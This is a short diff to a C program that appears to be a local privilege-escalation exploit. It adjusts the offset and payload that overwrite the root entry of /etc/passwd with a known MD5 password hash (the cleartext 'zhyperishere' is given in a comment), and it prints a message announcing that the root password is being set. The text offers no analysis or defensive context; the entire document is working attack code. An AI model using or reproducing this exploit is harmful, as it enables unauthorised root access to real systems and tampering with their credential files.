@@ -92,8 +92,8 @@ int main() {
         fclose(f1);
         fclose(f2);
 
-	loff_t offset = 4; // after the "root"
-	const char *const data = ":$1$zhyper$H4Vx9uKbWCzoONKNu4gcQ1:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt zhyper zhyperishere 
+	loff_t offset = 5; // after the "root"
+	const char *const data = "$1$zhyper$H4Vx9uKbWCzoONKNu4gcQ1:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt zhyper zhyperishere 
         printf("Setting root password to \"zhyperishere\"...\n");
 	const size_t data_size = strlen(data);
 
